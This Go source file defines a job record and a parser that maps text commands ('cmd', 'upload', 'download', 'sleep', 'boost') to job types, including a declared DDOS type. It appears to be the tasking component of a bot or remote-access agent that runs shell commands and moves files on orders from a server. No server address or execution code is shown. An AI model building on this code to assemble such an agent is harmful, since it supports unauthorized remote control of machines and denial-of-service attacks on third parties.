package main

import "strings"

type Job struct {
	Id      int    `json:"id"`
	Todo    string `json:"todo"`
	IsDone  bool   `json:"is_done"`
	Created string `json:"created"`
}

type JobType int

const (
	UNKNOWN JobType = iota
	SHELL_CMD
	UPLOAD
	DOWNLOAD
	DDOS
	CHDIR
	SLEEP
	BOOST
)

func parseJob(jobStr string) (JobType, []string) {
	values := strings.Fields(jobStr)
	valuesN := len(values)
	if valuesN == 0 {
		return UNKNOWN, nil
	}
	jobTypeStr := values[0]
	values = values[1:]
	valuesN--
	if jobTypeStr == "cmd" {
		return SHELL_CMD, values
	} else if jobTypeStr == "upload" && valuesN == 1 {
		return UPLOAD, values
	} else if jobTypeStr == "download" && valuesN == 2 {
		return DOWNLOAD, values
	} else if jobTypeStr == "sleep" && valuesN == 1 {
		return SLEEP, values
	} else if jobTypeStr == "boost" && valuesN == 1 {
		return BOOST, values
	}
	return UNKNOWN, nil
}
